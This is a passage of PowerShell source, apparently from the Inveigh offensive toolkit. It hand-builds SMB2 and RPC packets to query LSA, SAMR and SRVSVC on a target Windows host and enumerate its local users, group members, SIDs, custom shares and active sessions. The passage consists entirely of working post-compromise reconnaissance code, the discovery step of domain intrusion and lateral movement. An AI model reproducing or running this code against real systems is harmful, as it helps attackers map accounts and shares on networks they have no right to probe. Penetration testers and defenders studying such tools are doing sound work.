\n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data\n                        $stage = 'SendReceive'\n                        $step++\n                    }\n\n                    'LSALookupSids'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_LSARPC_data = New-PacketLSALookupSids $policy_handle $SID_array\n                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x0f,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   \n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'LSAOpenPolicy'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_LSARPC_data = New-PacketLSAOpenPolicy\n                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data \n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x06,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'LSAQueryInfoPolicy'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_LSARPC_data = New-PacketLSAQueryInfoPolicy $policy_handle\n                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x07,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   \n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data\n                        $stage = 'SendReceive' \n                    }\n\n                    'NetSessEnum'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SRVSVC_data = New-PacketSRVSVCNetSessEnum $Target\n                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SRVSVC_data.Length 1024\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00                        \n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SRVSVC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data\n                        $stage = 'SendReceive'\n                    }\n                    \n                    'NetShareEnumAll'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SRVSVC_data = New-PacketSRVSVCNetShareEnumAll $Target\n                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data \n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SRVSVC_data.Length 4280\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0f,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SRVSVC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'OpenAlias'\n                    {  \n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMROpenAlias $SAMR_domain_handle $SAMR_RID\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0c,0x00,0x00,0x00 0x00,0x00 0x1b,0x00\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'OpenDomain'\n                    {    \n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMROpenDomain $SAMR_connect_handle $SID_count $LSA_domain_SID\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x07,0x00,0x00,0x00 0x00,0x00 0x07,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'OpenGroup'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMROpenGroup $SAMR_domain_handle $SAMR_RID\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x13,0x00\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive' \n                    }\n\n                    'ParseLookupRids'\n                    {\n                        [Byte[]]$response_user_count_bytes = $client_receive[140..143]\n                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)\n                        $response_user_start = $response_user_count * 8 + 164\n                        $response_user_end = $response_user_start\n                        $response_user_length_start = 152\n                        $i = 0\n\n                        while($i -lt $response_user_count)\n                        {\n                            $response_user_object = New-Object PSObject\n                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]\n                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)\n                            $response_user_end = $response_user_start + $response_user_length\n                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]\n                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)\n                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]\n                            \n                            if($response_actual_count % 2)\n                            {\n                                $response_user_start += $response_user_length + 14\n                            }\n                            else\n                            {\n                                $response_user_start += $response_user_length + 12\n                            }\n\n                            $response_user = [System.BitConverter]::ToString($response_user_bytes)\n                            $response_user = $response_user -replace \"-00\",\"\"\n                            $response_user = $response_user.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)\n                            $response_user_length_start = $response_user_length_start + 8\n                            $i++\n                        }\n                        \n                        $stage = 'CloseRequest'\n                    }\n\n                    'ParseLookupSids'\n                    {\n                        [Byte[]]$response_domain_count_bytes = $client_receive[144..147]\n                        $response_domain_count = [System.BitConverter]::ToInt16($response_domain_count_bytes,0)\n                        $response_domain_start = $response_domain_count * 12 + 172\n                        $response_domain_end = $response_domain_start\n                        $response_domain_length_start = 160\n                        $enumerate_group_user_list = New-Object System.Collections.ArrayList\n                        $enumerate_group_group_list = New-Object System.Collections.ArrayList\n                        $response_domain_list = @()\n                        $i = 0\n\n                        while($i -lt $response_domain_count)\n                        {\n                            [Byte[]]$response_domain_length_bytes = $client_receive[$response_domain_length_start..($response_domain_length_start + 1)]\n                            $response_domain_length = [System.BitConverter]::ToInt16($response_domain_length_bytes,0)\n                            $response_domain_end = $response_domain_start + $response_domain_length\n                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_domain_start - 4)..($response_domain_start - 1)]\n                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)\n                            [Byte[]]$response_domain_bytes = $client_receive[$response_domain_start..($response_domain_end - 1)]\n                            \n                            if($response_actual_count % 2)\n                            {\n                                $response_domain_start += $response_domain_length + 42\n                            }\n                            else\n                            {\n                                $response_domain_start += $response_domain_length + 40\n                            }\n\n                            $response_domain = [System.BitConverter]::ToString($response_domain_bytes)\n                            $response_domain = $response_domain -replace \"-00\",\"\"\n                            $response_domain = $response_domain.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                            $response_domain = New-Object System.String ($response_domain,0,$response_domain.Length)\n                            $response_domain_list += $response_domain\n                            $response_domain_length_start = $response_domain_length_start + 12\n                            $i++\n                        }\n\n                        [Byte[]]$response_user_count_bytes = $client_receive[($response_domain_start - 4)..($response_domain_start - 1)]         \n                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)\n                        $response_user_start = $response_user_count * 16 + $response_domain_start + 12\n                        $response_user_end = $response_user_start\n                        $response_user_length_start = $response_domain_start + 4\n                        $i = 0\n\n                        while($i -lt $response_user_count)\n                        {\n                            [Byte[]]$response_user_type_bytes = $client_receive[($response_user_length_start - 4)]\n                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]\n                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)\n                            $response_SID_index_start = $response_user_length_start + 8\n                            [Byte[]]$response_SID_index_bytes = $client_receive[$response_SID_index_start..($response_SID_index_start + 3)]\n                            $response_SID_index = [System.BitConverter]::ToInt16($response_SID_index_bytes,0)\n                            $response_user_end = $response_user_start + $response_user_length\n                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]\n                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)\n                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]\n\n                            if($response_actual_count % 2)\n                            {\n                                $response_user_start += $response_user_length + 14\n                            }\n                            else\n                            {\n                                $response_user_start += $response_user_length + 12\n                            }\n\n                            $response_user = [System.BitConverter]::ToString($response_user_bytes)\n                            $response_user = $response_user -replace \"-00\",\"\"\n                            $response_user = $response_user.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)\n                            $response_user_length_start = $response_user_length_start + 16\n                            $response_administrator = $response_domain_list[$response_SID_index] + \"\\\" + $response_user\n\n                            if($response_user_type_bytes -eq 1)\n                            {\n                                $enumerate_group_user_list.Add($response_administrator) > $null\n                            }\n                            else\n                            {\n                                $enumerate_group_group_list.Add($response_administrator) > $null\n                            }\n                            \n                            $i++\n                        }\n\n                        if($enumerate_group_user_list -gt 0)\n                        {\n                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $target $EnumerateGroup group member users:\") > $null\n                            $inveigh.output_queue.Add($enumerate_group_user_list -join \",\") > $null\n                        }\n\n                        if($enumerate_group_group_list -gt 0)\n                        {\n                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $target $EnumerateGroup group member groups:\") > $null\n                            $inveigh.output_queue.Add($enumerate_group_group_list -join \",\") > $null\n                        }\n\n                        $stage = 'CloseRequest'\n                    }\n\n                    'ParseSRVSVC'\n                    {\n                        $response_object_list = @()\n                        $share_list = @()\n                        [Byte[]]$response_count_bytes = $client_receive[152..155]\n                        $response_count = [System.BitConverter]::ToInt32($response_count_bytes,0)\n                        $response_item_index = 164\n\n                        if($action_stage -eq 'Share')\n                        {\n                            $enumerate_share_list = New-Object System.Collections.ArrayList\n                        }\n                        else\n                        {\n                            $enumerate_netsession_list = New-Object System.Collections.ArrayList\n                        }\n                        \n                        $i = 0\n\n                        while($i -lt $response_count)\n                        {\n\n                            if($i -gt 0)\n                            {\n\n                                if($response_item_length % 2)\n                                {\n                                    $response_item_index += $response_item_length * 2 + 2\n                                }\n                                else\n                                {\n                                    $response_item_index += $response_item_length * 2\n                                }\n\n                            }\n                            else\n                            {\n                                \n                                if($action_stage -eq 'Share')\n                                {\n                                    $response_item_index += $response_count * 12\n                                }\n                                else\n                                {\n                                    $response_item_index += $response_count * 16\n                                }\n\n                            }\n\n                            [Byte[]]$response_item_length_bytes = $client_receive[$response_item_index..($response_item_index + 3)]\n                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)\n                            $response_item_index += 12\n                            [Byte[]]$response_item_bytes = $client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]\n                            $response_item = [System.BitConverter]::ToString($response_item_bytes)\n                            $response_item = $response_item -replace \"-00\",\"\"\n                            $response_item = $response_item.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                            $response_item = New-Object System.String ($response_item,0,$response_item.Length)\n                            \n                            if($response_item_length % 2)\n                            {\n                                $response_item_index += $response_item_length * 2 + 2\n                            }\n                            else\n                            {\n                                $response_item_index += $response_item_length * 2\n                            }\n                            \n                            [Byte[]]$response_item_length_bytes = $client_receive[$response_item_index..($response_item_index + 3)]\n                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)\n                            $response_item_index += 12\n                            [Byte[]]$response_item_2_bytes = $client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]\n                            $response_item_2 = [System.BitConverter]::ToString($response_item_2_bytes)\n                            $response_item_2 = $response_item_2 -replace \"-00\",\"\"\n                            $response_item_2 = $response_item_2.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                            $response_item_2 = New-Object System.String ($response_item_2,0,$response_item_2.Length)\n\n                            if($action_stage -eq 'Share')\n                            {\n\n                                if($response_item -ne 'ADMIN$' -and $response_item -notmatch '^[a-zA-Z][\\$]$' -and $response_item -ne 'IPC$' -and $response_item -ne 'print$')\n                                {\n                                    $enumerate_share_list.Add($response_item) > $null\n                                }\n                                \n                            }\n                            else\n                            {\n\n                                if($response_item -ne \"\\\\\" + $client.Client.LocalEndPoint.Address.IPAddressToString)\n                                {\n                                    $enumerate_netsession_list.Add($response_item + \"\\\" + $response_item_2) > $null\n                                }\n\n                            }\n\n                            $i++\n                        }\n\n                        if($enumerate_share_list.Count -gt 0 -and $action_stage -eq 'Share')\n                        {\n                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $target custom shares:\") > $null\n                            $inveigh.output_queue.Add($enumerate_share_list -join \",\") > $null\n                        }\n\n                        if($enumerate_netsession_list.Count -gt 0 -and $action_stage -eq 'NetSession')\n                        {\n                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $target NetSessions:\") > $null\n                            $inveigh.output_queue.Add($enumerate_netsession_list -join \",\") > $null\n                        }\n\n                        $stage = 'CloseRequest'\n                    }\n\n                    'ParseUsers'\n                    {\n                        [Byte[]]$response_user_count_bytes = $client_receive[148..151]\n                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)\n                        $response_user_start = $response_user_count * 12 + 172\n                        $response_user_end = $response_user_start\n                        $response_RID_start = 160\n                        $response_user_length_start = 164\n                        $enumerate_user_list = New-Object System.Collections.ArrayList\n                        $i = 0\n\n                        while($i -lt $response_user_count)\n                        {\n                            $response_user_object = New-Object PSObject\n                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]\n                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)\n                            [Byte[]]$response_RID_bytes = $client_receive[$response_RID_start..($response_RID_start + 3)]\n                            $response_user_end = $response_user_start + $response_user_length\n                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]\n                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)\n                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]\n                            \n                            if($response_actual_count % 2)\n                            {\n                                $response_user_start += $response_user_length + 14\n                            }\n                            else\n                            {\n                                $response_user_start += $response_user_length + 12\n                            }\n\n                            $response_user = [System.BitConverter]::ToString($response_user_bytes)\n                            $response_user = $response_user -replace \"-00\",\"\"\n                            $response_user = $response_user.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)\n                            $response_user_length_start = $response_user_length_start + 12\n                            $response_RID_start = $response_RID_start + 12\n                            $i++\n\n                            if($response_user -ne 'Guest')\n                            {\n                                $enumerate_user_list.Add($response_user) > $null\n                            }\n\n                        }\n\n                        if($enumerate_user_list -gt 0)\n                        {\n                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $target local users:\") > $null\n                            $inveigh.output_queue.Add($enumerate_user_list -join \",\") > $null\n                        }\n\n                        $stage = 'CloseRequest'\n                    }\n                \n                    'QueryGroupMember'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMRQueryGroupMember $group_handle\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x19,0x00\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'QueryInfoRequest'\n                    {          \n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SMB_data = New-PacketSMB2QueryInfoRequest 0x01 0x05 0x18,0x00,0x00,0x00 0x68,0x00 $file_ID\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data    \n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data\n                        $stage = 'SendReceive'\n                    }\n                \n                    'ReadRequest'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SMB_data = New-PacketSMB2ReadRequest $file_ID\n                        $packet_SMB_data[\"Length\"] = 0x00,0x04,0x00,0x00\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data \n                        $stage = 'SendReceive'\n                    }\n\n                    'RPCBind'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_RPC_data = New-PacketRPCBind $frag_length $call_ID $num_ctx_items 0x00,0x00 $named_pipe_UUID $named_pipe_UUID_version\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $packet_SMB_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data\n                        $stage = 'SendReceive' \n                    }\n\n                    'SAMRCloseRequest'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMRClose $SAMR_domain_handle\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x01,0x00\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'SendReceive'\n                    {\n                        $client_stream.Write($client_send,0,$client_send.Length) > $null\n                        $client_stream.Flush()\n                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null\n\n                        if(Get-StatusPending $client_receive[12..15])\n                        {\n                            $stage = 'StatusPending'\n                        }\n                        else\n                        {\n                            $stage = 'StatusReceived'\n                        }\n\n                    }\n            \n                    'StatusPending'\n                    {\n                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null\n\n                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')\n                        {\n                            $stage = $stage_next\n                        }\n\n                    }\n\n                    'StatusReceived'\n                    {\n                        \n                        switch ($stage_current)\n                        {\n\n                            'CloseRequest'\n                            {\n\n                                if($step -eq 1)\n                                {\n                                    $named_pipe = 0x73,0x00,0x61,0x00,0x6d,0x00,0x72,0x00 # samr\n                                    $stage = 'CreateRequest'\n                                }\n                                elseif($action_stage -eq 'Share' -and $share_list.Count -gt 0)\n                                {\n                                    $stage = 'TreeConnect'\n                                }\n                                else\n                                {\n                                    $stage = 'TreeDisconnect'\n                                }\n\n                            }\n\n                            'Connect2'\n                            {\n                                $step++\n\n                                if($client_receive[119] -eq 3 -and [System.BitConverter]::ToString($client_receive[140..143]) -eq '05-00-00-00')\n                                {\n                                    $RPC_access_denied = $true\n                                    $stage = 'CloseRequest'\n                                }\n                                else\n                                {\n                                    $SID_count = 0x04,0x00,0x00,0x00\n                                    [Byte[]]$SAMR_connect_handle = $client_receive[140..159]\n                                    $stage = 'OpenDomain'\n                                }\n\n                            }\n\n                            'Connect5'\n                            {\n                                $step++\n\n                                if($client_receive[119] -eq 3 -and [System.BitConverter]::ToString($client_receive[140..143]) -eq '05-00-00-00')\n                                {\n                                    $stage = 'CloseRequest'\n                                }\n                                else\n                                {\n                                    $SID_count = 0x04,0x00,0x00,0x00\n                                    [Byte[]]$SAMR_connect_handle = $client_receive[156..175]\n                                    $stage = 'OpenDomain'\n              